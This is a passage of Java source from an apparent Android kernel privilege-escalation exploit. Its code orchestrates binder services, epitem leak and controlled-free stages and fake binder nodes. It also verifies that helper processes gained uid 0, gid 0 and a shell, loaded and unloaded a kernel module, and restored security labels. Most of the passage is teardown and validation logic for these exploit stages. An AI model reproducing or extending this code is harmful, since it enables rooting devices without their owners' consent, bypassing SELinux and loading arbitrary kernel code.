                    "terminal-main-client-replaced");
        }
        addRetirementIdentity(liveIdentities, terminalMainClient,
                "raw-main");
        retirementRoles.put(terminalMainClient, "raw-main");
        synchronized (this) {
            if (rawClientProcessIdentity != terminalMainClient ||
                    rawClientService != terminalMainService ||
                    rawClientConnection != terminalMainConnection) {
                throw new IllegalStateException(
                        "terminal-main-client-changed");
            }
            rawClientRetiring = true;
        }
        if (rawVictimContextsActive) {
            terminalJavaRetirementStage = "raw-victim-contexts";
            String rawVictimRelease =
                    NativeBridge.releaseRawVictimContexts(
                            RAW_VICTIM_COUNT - 1);
            if (!rawVictimRelease.startsWith("status=pass")) {
                throw new IllegalStateException(
                        "terminal-raw-victim-contexts [" +
                                rawVictimRelease + "]");
            }
            rawVictimContextsActive = false;
        }
        synchronized (extraRawClientLock) {
            for (RawClientSlot slot : extraRawClientSlots) {
                if (slot.state == RawClientSlotState.CONSUMED) {
                    if (slot.connection != null || slot.bound ||
                            slot.unbinding || slot.service != null ||
                            slot.pid != -1 || slot.identity != null) {
                        throw new IllegalStateException(
                                "terminal-extra-consumed-" + slot.index);
                    }
                    continue;
                }
                if (slot.state != RawClientSlotState.ACTIVE ||
                        slot.connection == null || !slot.bound ||
                        slot.unbinding || slot.service == null ||
                        slot.pid <= 0 || slot.identity == null ||
                        slot.identity.pid != slot.pid ||
                        !isOriginalIdentityLive(slot.identity)) {
                    throw new IllegalStateException(
                            "terminal-extra-identities-" + slot.index);
                }
                ProcessIdentity observed = queryServiceIdentity(
                        slot.service,
                        RawBClientService.TRANSACTION_IDENTITY);
                if (observed == null || observed.pid != slot.identity.pid ||
                        observed.startTime != slot.identity.startTime) {
                    throw new IllegalStateException(
                            "terminal-extra-replaced-" + slot.index);
                }
                addRetirementIdentity(liveIdentities, slot.identity,
                        "raw-extra-" + slot.index);
                retirementRoles.put(slot.identity,
                        "raw-extra-" + slot.index);
                liveExtraSlots.add(slot);
            }
            for (RawClientSlot slot : liveExtraSlots) {
                slot.state = RawClientSlotState.RETIRING;
            }
        }
        List<Long> terminalDeathBarriers = new ArrayList<>();
        for (IBinder service : Arrays.asList(
                terminalRawTargetService, terminalOwnerService,
                terminalAnchorService, terminalMainService)) {
            long barrier = NativeBridge.armBinderDeathBarrier(service);
            if (barrier == 0) {
                throw new IllegalStateException(
                        "terminal-death-barrier-arm");
            }
            terminalDeathBarriers.add(barrier);
        }
        synchronized (extraRawClientLock) {
            for (RawClientSlot slot : liveExtraSlots) {
                if (slot.deathBarrier == 0) {
                    throw new IllegalStateException(
                            "terminal-extra-death-barrier-" + slot.index);
                }
                terminalDeathBarriers.add(slot.deathBarrier);
                slot.deathBarrier = 0;
            }
        }
        if (terminalDeathBarriers.size() != liveIdentities.size()) {
            throw new IllegalStateException(
                    "terminal-death-barrier-count");
        }
        long deadline = SystemClock.elapsedRealtime() +
                TERMINAL_RETIREMENT_TIMEOUT_MS;
        terminalJavaRetirementStage = "anchor-request";
        armAnchorTerminalRetirement(deadline);
        terminalJavaRetirementStage = "main-client-request";
        requestTerminalRetirement(
                terminalMainService, terminalMainClient,
                RawBClientService.TRANSACTION_TERMINAL_RETIRE,
                "raw-main", deadline);
        terminalJavaRetirementStage = "extra-requests";
        for (RawClientSlot slot : liveExtraSlots) {
            terminalJavaRetirementStage =
                    "extra-requests-" + slot.index;
            requestTerminalRetirement(
                    slot.service, slot.identity,
                    RawBClientService.TRANSACTION_TERMINAL_RETIRE,
                    "raw-extra-" + slot.index, deadline);
        }
        terminalJavaRetirementStage = "unbind-clear-stop";
        releaseIsolatedConnections();
        if (!unbindMainRawClientConnection(terminalMainConnection)) {
            throw new IllegalStateException(
                    "terminal-main-client-unbind");
        }
        synchronized (this) {
            if (rawClientConnection != null || rawClientBound ||
                    rawClientUnbinding) {
                throw new IllegalStateException(
                        "terminal-main-client-bound");
            }
            rawClientService = null;
            rawClientPid = -1;
            rawClientProcessIdentity = null;
            rawClientConnectedOnce = false;
        }
        for (RawClientSlot slot : liveExtraSlots) {
            ServiceConnection slotConnection;
            synchronized (extraRawClientLock) {
                slotConnection = slot.connection;
            }
            if (slotConnection != null &&
                    !unbindExtraRawClientSlot(slot, slotConnection)) {
                throw new IllegalStateException(
                        "terminal-extra-unbind-" + slot.index);
            }
            synchronized (extraRawClientLock) {
                if (slot.connection != null || slot.bound ||
                        slot.unbinding) {
                    throw new IllegalStateException(
                            "terminal-extra-bound-" + slot.index);
                }
                slot.service = null;
                slot.identity = null;
                slot.pid = -1;
                slot.state = RawClientSlotState.CONSUMED;
            }
        }
        if (rawTargetConnection != null) {
            terminalJavaRetirementStage = "raw-target-unbind";
            unbindService(rawTargetConnection);
            rawTargetConnection = null;
        }
        rawTargetService = null;
        rawTargetPid = -1;
        terminalJavaRetirementStage = "raw-target-retire";
        if (terminalRawTarget == null ||
                !isOriginalIdentityLive(terminalRawTarget)) {
            throw new IllegalStateException(
                    "terminal-raw-target-identity");
        }
        String rawTargetRetire = "nonce=" + rootWatchdogNonce +
                " target_pid=" + terminalRawTarget.pid +
                " target_start_time=" + terminalRawTarget.startTime +
                " boot_id=" + rootWatchdogBootId +
                " host_helper_retired=1";
        writePrivateAtomic("raw-target.retire", rawTargetRetire);
        File rawTargetResult = new File(
                getFilesDir(), "raw-target.retirement.result");
        long rawTargetRemaining = deadline -
                SystemClock.elapsedRealtime();
        if (rawTargetRemaining <= 0) {
            throw new IllegalStateException(
                    "terminal-raw-target-deadline");
        }
        waitForEither(rawTargetResult, null,
                (int) Math.min(Integer.MAX_VALUE, rawTargetRemaining));
        String expectedRawTargetResult =
                "status=pass stage=raw-target-retirement" +
                " nonce=" + rootWatchdogNonce +
                " target_pid=" + terminalRawTarget.pid +
                " target_start_time=" + terminalRawTarget.startTime +
                " boot_id=" + rootWatchdogBootId +
                " self_exit=1";
        if (!expectedRawTargetResult.equals(readSmall(rawTargetResult))) {
            throw new IllegalStateException(
                    "terminal-raw-target-result");
        }
        requiredCheckpoint("terminal-raw-target-retired");
        if (anchorHolderConnection != null) {
            unbindService(anchorHolderConnection);
            anchorHolderConnection = null;
        }
        anchorHolderService = null;
        anchorHolderPid = -1;
        if (ownerConnectionBound) {
            terminalJavaRetirementStage = "owner-unbind";
            unbindService(connection);
            ownerConnectionBound = false;
        }
        terminalJavaRetirementStage = "owner-unbind";
        if (terminalOwner == null ||
                !isOriginalIdentityLive(terminalOwner)) {
            throw new IllegalStateException(
                    "terminal-owner-identity");
        }
        if (chainEpitemBound) {
            unbindService(chainEpitemConnection);
            chainEpitemBound = false;
        }
        ownerService = null;
        ownerServicePid = -1;
        terminalJavaRetirementStage = "owner-retire";
        if (isOriginalIdentityLive(terminalOwner)) {
            Process.killProcess(terminalOwner.pid);
        }
        while (isOriginalIdentityLive(terminalOwner) &&
                SystemClock.elapsedRealtime() < deadline) {
            Thread.sleep(10);
        }
        if (isOriginalIdentityLive(terminalOwner)) {
            throw new IllegalStateException(
                    "terminal-owner-retirement-timeout");
        }
        String ownerRetirementProof =
                "status=pass stage=owner-terminal-retirement" +
                " nonce=" + rootWatchdogNonce +
                " owner_pid=" + terminalOwner.pid +
                " owner_start_time=" + terminalOwner.startTime +
                " boot_id=" + rootWatchdogBootId +
                " exit_signal=9";
        writePrivateAtomic("owner-terminal-retirement.result",
                ownerRetirementProof);
        requiredCheckpoint("terminal-owner-retired");
        credentialTarget = null;
        securityTarget = null;
        controlledNode = null;
        kernelAnchorRetained = 0;
        rawCurrentProcMarkerRetained = 0;
        rawCohortSiblings = null;
        cohort = null;
        cohortPointers = null;
        cohortCookies = null;
        fillerNodes = null;
        stopService(new Intent(this, RawBClientService.class));
        stopExtraRawClientServices();
        stopService(new Intent(this, RawTargetService.class));
        stopService(new Intent(this, AnchorHolderService.class));
        stopService(new Intent(this, OwnerService.class));
        stopService(new Intent(this, OwnerService2.class));
        terminalJavaRetirementStage = "wait-identities";
        waitForRetiredIdentities(
                liveIdentities, retirementRoles, deadline);
        requiredCheckpoint("terminal-process-identities-retired");
        int terminalDeaths = 0;
        for (long barrier : terminalDeathBarriers) {
            long remaining = deadline - SystemClock.elapsedRealtime();
            String death = NativeBridge.awaitBinderDeathBarrier(
                    barrier,
                    (int) Math.max(1, Math.min(Integer.MAX_VALUE, remaining)));
            if (death.startsWith("status=pass")) {
                terminalDeaths++;
            }
        }
        if (terminalDeaths != terminalDeathBarriers.size()) {
            throw new IllegalStateException(
                    "terminal-death-barrier-wait");
        }
        requiredCheckpoint("terminal-binder-deaths-pass");
        releaseExtraRawClientSlots(true);
        rawTargetProcessIdentity = null;
        anchorHolderProcessIdentity = null;
        ownerProcessIdentity = null;
        requiredCheckpoint("terminal-process-retirement-settled");
    }

    private void retireTerminalJavaObjectsBounded() throws Exception {
        FutureTask<Void> retirement = new FutureTask<>(() -> {
            retireTerminalJavaObjects();
            return null;
        });
        Thread worker = new Thread(retirement,
                "terminal-java-retirement");
        worker.setDaemon(true);
        worker.start();
        try {
            retirement.get(TERMINAL_RETIREMENT_WORKER_TIMEOUT_MS,
                    TimeUnit.MILLISECONDS);
        } catch (TimeoutException exception) {
            retirement.cancel(true);
            throw new IllegalStateException(
                    "terminal-java-retirement-timeout", exception);
        } catch (InterruptedException exception) {
            retirement.cancel(true);
            Thread.currentThread().interrupt();
            throw exception;
        } catch (ExecutionException exception) {
            Throwable cause = exception.getCause();
            if (cause instanceof Exception) {
                throw (Exception) cause;
            }
            throw new IllegalStateException(
                    "terminal-java-retirement-worker", cause);
        }
    }

    private void addRetirementIdentity(List<ProcessIdentity> identities,
                                       ProcessIdentity identity,
                                       String reason) {
        if (identity == null || identity.pid <= 0 ||
                identity.pid == Process.myPid() || identity.startTime <= 0) {
            throw new IllegalStateException(
                    "terminal-process-identity-" + reason);
        }
        for (ProcessIdentity existing : identities) {
            if (existing.pid == identity.pid) {
                throw new IllegalStateException(
                        "terminal-process-duplicate-" + reason);
            }
        }
        identities.add(identity);
    }

    private void requestTerminalRetirement(IBinder service,
                                           ProcessIdentity identity,
                                           int transaction,
                                           String reason,
                                           long deadline) throws Exception {
        if (!isOriginalIdentityLive(identity)) {
            return;
        }
        if (service == null || SystemClock.elapsedRealtime() >= deadline) {
            throw new IllegalStateException(
                    "terminal-retirement-request-" + reason);
        }
        Parcel data = Parcel.obtain();
        try {
            data.writeInt(identity.pid);
            data.writeLong(identity.startTime);
            if (!service.transact(transaction, data, null,
                    IBinder.FLAG_ONEWAY) &&
                    isOriginalIdentityLive(identity)) {
                throw new IllegalStateException(
                        "terminal-retirement-transaction-" + reason);
            }
        } catch (Exception exception) {
            if (isOriginalIdentityLive(identity)) {
                throw exception;
            }
        } finally {
            data.recycle();
        }
    }

    private void armAnchorTerminalRetirement(long deadline)
            throws Exception {
        ProcessIdentity identity = anchorHolderProcessIdentity;
        if (identity == null || !isOriginalIdentityLive(identity) ||
                anchorHolderService == null ||
                SystemClock.elapsedRealtime() >= deadline) {
            throw new IllegalStateException(
                    "terminal-anchor-arm-precondition");
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInt(identity.pid);
            data.writeLong(identity.startTime);
            data.writeString(rootWatchdogNonce);
            data.writeString(rootWatchdogBootId);
            if (!anchorHolderService.transact(
                    AnchorHolderService.TRANSACTION_TERMINAL_RETIRE,
                    data, reply, 0)) {
                throw new IllegalStateException(
                        "terminal-anchor-arm-transaction");
            }
            reply.readException();
            String state = reply.readString();
            String expected =
                    "status=pass stage=anchor-terminal-arm" +
                    " nonce=" + rootWatchdogNonce +
                    " anchor_pid=" + identity.pid +
                    " anchor_start_time=" + identity.startTime +
                    " boot_id=" + rootWatchdogBootId + " armed=1";
            if (!expected.equals(state) || reply.dataAvail() != 0) {
                throw new IllegalStateException(
                        "terminal-anchor-arm-result");
            }
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private boolean isOriginalIdentityLive(ProcessIdentity identity) {
        long currentStart = ProcessIdentity.readStartTime(identity.pid);
        if (currentStart == identity.startTime) {
            return true;
        }
        if (currentStart < 0 &&
                new File("/proc/" + identity.pid).exists()) {
            throw new IllegalStateException(
                    "terminal-process-identity-unreadable-" + identity.pid);
        }
        return false;
    }

    private void waitForRetiredIdentities(
            List<ProcessIdentity> identities,
            IdentityHashMap<ProcessIdentity, String> roles,
            long deadline)
            throws Exception {
        while (SystemClock.elapsedRealtime() < deadline) {
            boolean originalLive = false;
            for (ProcessIdentity identity : identities) {
                if (isOriginalIdentityLive(identity)) {
                    originalLive = true;
                    break;
                }
            }
            if (!originalLive) {
                return;
            }
            long remaining = deadline - SystemClock.elapsedRealtime();
            if (remaining > 0) {
                Thread.sleep(Math.min(20, remaining));
            }
        }
        StringBuilder live = new StringBuilder();
        for (ProcessIdentity identity : identities) {
            if (isOriginalIdentityLive(identity)) {
                if (live.length() > 0) {
                    live.append(',');
                }
                String role = roles.get(identity);
                live.append(role == null ? "unknown" : role)
                        .append('-').append(identity.pid);
            }
        }
        if (live.length() > 0) {
            throw new IllegalStateException(
                    "terminal-process-retirement-timeout-" + live);
        }
        return;
    }

    private void stopExtraRawClientServices() {
        Class<?>[] classes = {
                RawBClient1Service.class, RawBClient2Service.class,
                RawBClient3Service.class, RawBClient4Service.class,
                RawBClient5Service.class, RawBClient6Service.class,
                RawBClient7Service.class, RawBClient8Service.class,
                RawBClient9Service.class, RawBClient10Service.class,
                RawBClient11Service.class, RawBClient12Service.class,
                RawBClient13Service.class, RawBClient14Service.class,
                RawBClient15Service.class, RawBClient16Service.class,
                RawBClient17Service.class, RawBClient18Service.class
        };
        for (Class<?> clientClass : classes) {
            stopService(new Intent(this, clientClass));
        }
    }

    private void clearEpitemLeakFiles() {
        String[] names = {
                "epitem-reader.prepare", "epitem-reader.waiting",
                "epitem-reader.start", "epitem-reader.fragmented",
                "epitem-fragment.result",
                "epitem-preferred-cpu",
                "epitem-client.queued", "epitem-client.exiting",
                "epitem-client.death-ready",
                "epitem-node-tokens.bin", "epitem-leak.unread-ready",
                "epitem-nodes-decremented", "kmalloc-predrain.released",
                "blockers-reset.request", "blockers-reset.ready",
                "blockers-saturated.ready",
                "owner-fragments-cleanup.request",
                "owner-fragments-cleanup.ready",
                "owner-terminal-retire",
                "owner-terminal-retire.trigger",
                "owner-terminal-retirement.result",
                "anchor-terminal-arm.result",
                "epitem-leak.read-enable", "epitem-leak.result",
                "epitem-leaks.bin", "controlled-reader.request",
                "controlled-export.ready", "controlled-export.proceed",
                "controlled-read.enable", "controlled-reader.result",
                "controlled-free.enable", "controlled-free.result",
                "binder-ref.analysis", "fake-node.prepare-state",
                "binder-ref.anchor-retained",
                "root-action.done", "root-action-security.done",
                "root-write-arm.done",
                "root-watchdog-arm.done",
                "private-credential.request",
                "private-credential-arm.done",
                "resukisu-stage.plan",
                "ctlbuf-rescue.plan",
                "ctlbuf-rescue-plan.result",
                "ctlbuf-finalise.result",
                "helper-normalised.done", "helper-retired.done",
                "credential-target-death.result",
                "ctlbuf-donor-frozen.done",
                "raw-target.blocked", "raw-target.start",
                "raw-target.retire", "raw-target.retirement.result",
                "raw-target.multi-export", "raw-target.deferred-export",
                "raw-cohort.ready",
                "raw-cohort-export.result",
                "raw-cohort-settle.result",
                "raw-target.reading", "raw-target.result",
                "raw-client.queued", "raw-client.result",
                "proc-teardown.token",
                "raw-extra-export.enable", "raw-extra-export.ready",
                "raw-extra-export.thread-ready",
                "raw-extra-export.receivers-go",
                "raw-extra-export.looper-go", "raw-extra-export.go",
                "raw-extra-export.submitting",
                "raw-extra-export.reply-go",
                "raw-extra-export.reply-signal",
                "raw-extra-export.target-result"
        };
        for (String name : names) {
            File file = new File(getFilesDir(), name);
            if (file.exists()) {
                file.delete();
            }
        }
        for (int victim = 0; victim < RAW_VICTIM_COUNT; victim++) {
            String suffix = "." + victim;
            String[] indexed = {
                    "controlled-read.enable" + suffix,
                    "controlled-reader.result" + suffix,
                    "controlled-free.enable" + suffix,
                    "controlled-free.result" + suffix,
                    "raw-target.reading" + suffix
            };
            for (String name : indexed) {
                File file = new File(getFilesDir(), name);
                if (file.exists()) {
                    file.delete();
                }
            }
        }
        for (int index = 0; index < RAW_VICTIM_COUNT - 1; index++) {
            String[] indexed = {
                    "raw-extra-export.thread-ready." + index,
                    "raw-extra-export.ready." + index,
                    "raw-extra-export.target-result." + (index + 1),
                    "raw-extra-export.result." + index,
                    "raw-extra-queue.enable." + index
            };
            for (String name : indexed) {
                File file = new File(getFilesDir(), name);
                if (file.exists()) {
                    file.delete();
                }
            }
        }
    }

    private void waitForEither(File first, File second, int timeoutMs)
            throws Exception {
        int attempts = Math.max(1, timeoutMs / 20);
        for (int attempt = 0; attempt < attempts; attempt++) {
            if (first.exists() || (second != null && second.exists())) {
                return;
            }
            Thread.sleep(20);
        }
        throw new IllegalStateException("stage-timeout");
    }

    private String readSmall(File file) throws Exception {
        if (!file.exists()) {
            return "status=fail reason=result-missing";
        }
        return new String(java.nio.file.Files.readAllBytes(file.toPath()),
                StandardCharsets.UTF_8).trim();
    }

    private boolean prepareTerminalCtlbufRescuePlan(StringBuilder writes)
            throws Exception {
        String rescuePlan = NativeBridge.terminalCtlbufRescuePlan(
                rootWatchdogNonce);
        writePrivateAtomic("ctlbuf-rescue-plan.result", rescuePlan);
        writes.append(" ctlbuf_rescue_plan=[")
                .append(rescuePlan).append("]");
        if (!rescuePlan.startsWith(
                "status=pass stage=ctlbuf-rescue-plan ")) {
            checkpoint("ctlbuf-rescue-plan-failed");
            return false;
        }
        writePrivateAtomic("ctlbuf-rescue.plan", rescuePlan);
        checkpoint("ctlbuf-rescue-plan-ready");
        return true;
    }

    private static int parsePositiveInt(String value) {
        try {
            int parsed = Integer.parseInt(value);
            return parsed > 0 ? parsed : -1;
        } catch (Exception exception) {
            return -1;
        }
    }

    private boolean isRootWatchdogArmValid(File arm) {
        try {
            if (!rootWatchdogNonce.matches("[0-9a-f]{32}") ||
                    rootWatchdogHelperPid <= 0 ||
                    !rootWatchdogHelperStart.matches("[1-9][0-9]*") ||
                    !rootWatchdogBootId.matches(
                            "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                            "[0-9a-f]{4}-[0-9a-f]{12}")) {
                return false;
            }
            String[] fields = readSmall(arm).split(" ", -1);
            if (fields.length != 6 ||
                    !fields[0].equals("nonce=" + rootWatchdogNonce) ||
                    !fields[1].equals(
                            "helper_pid=" + rootWatchdogHelperPid) ||
                    !fields[2].equals(
                            "helper_start_time=" + rootWatchdogHelperStart) ||
                    !fields[4].equals("boot_id=" + rootWatchdogBootId) ||
                    !fields[5].equals("host_helper_identity=1") ||
                    !fields[3].startsWith("watchdog_tid=")) {
                return false;
            }
            int watchdogTid = parsePositiveInt(fields[3].substring(
                    "watchdog_tid=".length()));
            if (watchdogTid <= 0 ||
                    !rootWatchdogBootId.equals(readSmall(new File(
                            "/proc/sys/kernel/random/boot_id")))) {
                return false;
            }
            rootWatchdogTid = watchdogTid;
            return true;
        } catch (Exception exception) {
            return false;
        }
    }

    private boolean isPrivateCredentialArmValid(File arm) {
        try {
            if (!rootWatchdogNonce.matches("[0-9a-f]{32}") ||
                    rootWatchdogHelperPid <= 0 ||
                    !rootWatchdogHelperStart.matches("[0-9]+") ||
                    !rootWatchdogBootId.matches(
                            "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                            "[0-9a-f]{4}-[0-9a-f]{12}")) {
                return false;
            }
            String[] fields = readSmall(arm).split(" ", -1);
            if (fields.length != 6 ||
                    !fields[0].equals("nonce=" + rootWatchdogNonce) ||
                    !fields[1].equals(
                            "helper_pid=" + rootWatchdogHelperPid) ||
                    !fields[2].equals(
                            "helper_start_time=" + rootWatchdogHelperStart) ||
                    !fields[3].equals(
                            "main_tid=" + rootWatchdogHelperPid) ||
                    !fields[4].equals("boot_id=" + rootWatchdogBootId) ||
                    !fields[5].equals("host_helper_identity=1") ||
                    !rootWatchdogBootId.equals(readSmall(new File(
                            "/proc/sys/kernel/random/boot_id")))) {
                return false;
            }
            return true;
        } catch (Exception exception) {
            return false;
        }
    }

    private String preparePrivateCredential() {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(PRIVATE_CREDENTIAL_DESCRIPTOR);
            data.writeString(rootWatchdogNonce);
            data.writeInt(rootWatchdogHelperPid);
            data.writeString(rootWatchdogHelperStart);
            data.writeInt(rootWatchdogHelperPid);
            data.writeString(rootWatchdogBootId);
            if (credentialTarget == null || !credentialTarget.transact(
                    TRANSACTION_PREPARE_PRIVATE_CREDENTIAL,
                    data, reply, 0)) {
                return "status=fail stage=private-credential-request " +
                        "reason=transaction";
            }
            reply.readException();
            String state = reply.readString();
            if (state == null || !state.startsWith("status=pass")) {
                return state == null
                        ? "status=fail stage=private-credential-request " +
                                "reason=reply"
                        : state;
            }
            ParcelFileDescriptor module = reply.readFileDescriptor();
            ParcelFileDescriptor vendor = reply.readFileDescriptor();
            if (module == null || vendor == null || reply.dataAvail() != 0 ||
                    ctlbufModuleFd != null || ctlbufVendorFd != null) {
                closeParcelFileDescriptor(module);
                closeParcelFileDescriptor(vendor);
                return "status=fail stage=private-credential-request " +
                        "reason=resources";
            }
            ctlbufModuleFd = module;
            ctlbufVendorFd = vendor;
            return state;
        } catch (Exception exception) {
            return "status=fail stage=private-credential-request reason=" +
                    exception.getClass().getSimpleName();
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private static boolean closeParcelFileDescriptor(
            ParcelFileDescriptor descriptor) {
        if (descriptor == null) {
            return true;
        }
        try {
            descriptor.close();
            return true;
        } catch (IOException ignored) {
            return false;
        }
    }

    private boolean isTerminalHostGateValid(File gate, boolean retired) {
        try {
            String[] fields = readSmall(gate).split(" ", -1);
            int expected = retired ? 54 : 53;
            if (fields.length != expected ||
                    !fields[0].equals("nonce=" + rootWatchdogNonce) ||
                    !fields[1].equals(
                            "helper_pid=" + rootWatchdogHelperPid) ||
                    !fields[2].equals(
                            "helper_start_time=" + rootWatchdogHelperStart) ||
                    !fields[3].equals("boot_id=" + rootWatchdogBootId) ||
                    !rootWatchdogBootId.equals(readSmall(new File(
                            "/proc/sys/kernel/random/boot_id")))) {
                return false;
            }
            if (!fields[4].startsWith("watchdog_tid=") ||
                    Integer.parseInt(fields[4].substring(
                            "watchdog_tid=".length())) <= 0 ||
                    fields[4].equals(
                            "watchdog_tid=" + rootWatchdogHelperPid) ||
                    !fields[5].equals("joined=1") ||
                    !fields[6].equals("tid_gone=1") ||
                    !fields[7].equals("uid_result=0") ||
                    !fields[8].equals("gid_result=0") ||
                    !fields[9].equals("shell=1") ||
                    !fields[10].equals("ctlbuf_repaired=1") ||
                    !fields[11].equals("module_loaded=1") ||
                    !fields[12].equals("module_unloaded=1") ||
                    !fields[13].equals("module_finalised=1") ||
                    !fields[14].equals("finalise_proof=1") ||
                    !fields[15].equals("donor_frozen=1") ||
                    !fields[16].equals("donor_resumed=1") ||
                    !fields[17].equals(
                            "donor_resume_pid=" + ctlbufDonorPid) ||
                    !fields[18].equals("donor_resume_result=0") ||
                    !fields[19].equals("donor_resume_errno=0")) {
                return false;
            }
            String[] resumePrefixes = {
                    "resume_magic=0x", "resume_version=", "resume_size=",
                    "resume_cookie_hi=0x", "resume_cookie_lo=0x",
                    "resume_helper_task=0x", "resume_helper_pid=",
                    "resume_donor_task=0x",
                    "resume_donor_tgid=", "resume_signal=",
                    "resume_before_state=0x", "resume_before_exit_state=0x",
                    "resume_before_threads=", "resume_before_stopped=",
                    "resume_after_state=0x", "resume_after_exit_state=0x",
                    "resume_after_threads=", "resume_after_stopped=",
                    "resume_stable_samples=", "resume_task_security=0x",
                    "resume_task_security_word8=0x",
                    "resume_inode_security=0x",
                    "resume_inode_security_word8=0x",
                    "resume_labels_restored=", "resume_resumed=",
                    "resume_proof=",
                    "resume_commit=0x",
            };
            for (int index = 0; index < resumePrefixes.length; index++) {
                if (!fields[20 + index].startsWith(resumePrefixes[index])) {
                    return false;
                }
            }
            long resumeMagic = Long.parseUnsignedLong(
                    fields[20].substring("resume_magic=0x".length()), 16);
            long cookieHi = Long.parseUnsignedLong(
                    fields[23].substring("resume_cookie_hi=0x".length()), 16);
            long cookieLo = Long.parseUnsignedLong(
                    fields[24].substring("resume_cookie_lo=0x".length()), 16);
            long helperTask = Long.parseUnsignedLong(
                    fields[25].substring("resume_helper_task=0x".length()), 16);
            long donorTask = Long.parseUnsignedLong(
                    fields[27].substring("resume_donor_task=0x".length()), 16);
            long beforeState = Long.parseUnsignedLong(
                    fields[30].substring("resume_before_state=0x".length()), 16);
            long beforeExitState = Long.parseUnsignedLong(
                    fields[31].substring(
                            "resume_before_exit_state=0x".length()), 16);
            int beforeThreads = Integer.parseInt(fields[32].substring(
                    "resume_before_threads=".length()));
            int beforeStopped = Integer.parseInt(fields[33].substring(
                    "resume_before_stopped=".length()));
            long afterState = Long.parseUnsignedLong(
                    fields[34].substring("resume_after_state=0x".length()), 16);
            long afterExitState = Long.parseUnsignedLong(
                    fields[35].substring(
                            "resume_after_exit_state=0x".length()), 16);
            int afterThreads = Integer.parseInt(fields[36].substring(
                    "resume_after_threads=".length()));
            long taskSecurity = Long.parseUnsignedLong(
                    fields[39].substring("resume_task_security=0x".length()), 16);
            long inodeSecurity = Long.parseUnsignedLong(
                    fields[41].substring("resume_inode_security=0x".length()), 16);
            long resumeCommit = Long.parseUnsignedLong(
                    fields[46].substring("resume_commit=0x".length()), 16);
            long expectedCookieHi = Long.parseUnsignedLong(
                    rootWatchdogNonce.substring(0, 16), 16);
            long expectedCookieLo = Long.parseUnsignedLong(
                    rootWatchdogNonce.substring(16), 16);
            if (resumeMagic != 0x4c5033524553554dL ||
                    !fields[21].equals("resume_version=1") ||
                    !fields[22].equals("resume_size=176") ||
                    cookieHi != expectedCookieHi ||
                    cookieLo != expectedCookieLo ||
                    helperTask == 0 || donorTask == 0 ||
                    !fields[26].equals(
                            "resume_helper_pid=" + rootWatchdogHelperPid) ||
                    !fields[28].equals(
                            "resume_donor_tgid=" + ctlbufDonorPid) ||
                    !fields[29].equals("resume_signal=18") ||
                    (beforeState & 0xcL) == 0 || beforeExitState != 0 ||
                    beforeThreads <= 0 || beforeThreads > 4096 ||
                    beforeStopped != beforeThreads ||
                    (afterState & 0xcL) != 0 || afterExitState != 0 ||
                    afterThreads <= 0 || afterThreads > 4096 ||
                    !fields[37].equals("resume_after_stopped=0") ||
                    !fields[38].equals("resume_stable_samples=2") ||
                    taskSecurity == 0 || inodeSecurity == 0 ||
                    !fields[40].equals("resume_task_security_word8=0x0") ||
                    !fields[42].equals("resume_inode_security_word8=0x0") ||
                    !fields[43].equals("resume_labels_restored=1") ||
                    !fields[44].equals("resume_resumed=1") ||
                    !fields[45].equals("resume_proof=1") ||
                    resumeCommit != (resumeMagic ^ cookieHi ^ cookieLo ^
                            donorTask ^ 0xa5d91f7462c83be0L)) {
                return false;
            }
            if (!fields[47].equals("host_donor_pid=" + ctlbufDonorPid) ||
                    !fields[48].equals(
                            "host_donor_start_time=" + ctlbufDonorStart) ||
                    !fields[49].startsWith("host_donor_tids=") ||
                    !fields[50].startsWith("host_donor_states=") ||
                    !fields[51].equals("host_donor_samples=2")) {
                return false;
            }
            String[] hostTids = fields[49].substring(
                    "host_donor_tids=".length()).split(",", -1);
            String[] hostStates = fields[50].substring(
                    "host_donor_states=".length()).split(",", -1);
            if (hostTids.length == 0 || hostTids.length != hostStates.length) {
                return false;
            }
            for (int index = 0; index < hostTids.length; index++) {
                int tid = Integer.parseInt(hostTids[index]);
                String prefix = tid + ":";
                if (tid <= 0 || !hostStates[index].startsWith(prefix) ||
                        hostStates[index].length() != prefix.length() + 1 ||
                        hostStates[index].endsWith("T") ||
                        hostStates[index].endsWith("t")) {
                    return false;
                }
            }
            if (retired) {
                return fields[52].equals("helper_retired=1") &&
                        fields[53].equals("host_helper_identity=1");
            }
            return fields[52].equals("host_helper_identity=1");
        } catch (Exception exception) {
            return false;
        }
    }

    private boolean isCtlbufDonorFrozenGateValid(File gate) {
        try {
            String[] fields = readSmall(gate).split(" ", -1);
            return fields.length == 5 && ctlbufDonorPid > 0 &&
                    !ctlbufDonorStart.isEmpty() &&
                    fields[0].equals("nonce=" + rootWatchdogNonce) &&
                    fields[1].equals("donor_pid=" + ctlbufDonorPid) &&
                    fields[2].equals(
                            "donor_start_time=" + ctlbufDonorStart) &&
                    fields[3].equals("boot_id=" + rootWatchdogBootId) &&
                    fields[4].equals("host_donor_frozen=1") &&
                    rootWatchdogBootId.equals(readSmall(new File(
                            "/proc/sys/kernel/random/boot_id")));
        } catch (Exception exception) {
            return false;
        }
    }

    private boolean fetchControlledNode(IBinder service) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!service.transact(OwnerService.TRANSACTION_CONTROLLED_NODE,
                                  data, reply, 0)) {
                return false;
            }
            reply.readException();
            controlledNode = reply.readStrongBinder();
            if (controlledNode == null) {
                return false;
            }
        } catch (Exception exception) {
            return false;
        } finally {
            reply.recycle();
            data.recycle();
        }
        Parcel tokenData = Parcel.obtain();
        Parcel tokenReply = Parcel.obtain();
        try {
            if (!service.transact(OwnerService.TRANSACTION_CONTROLLED_TOKENS,
                                  tokenData, tokenReply, 0)) {
                return false;
            }
            tokenReply.readException();
            controlledPointer = tokenReply.readLong();
            controlledCookie = tokenReply.readLong();
            return true;
        } catch (Exception exception) {
            return false;
        } finally {
            tokenReply.recycle();
            tokenData.recycle();
        }
    }

    private boolean fetchFillerNodes(IBinder service) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!service.transact(OwnerService.TRANSACTION_FILLER_NODES,
                                  data, reply, 0)) {
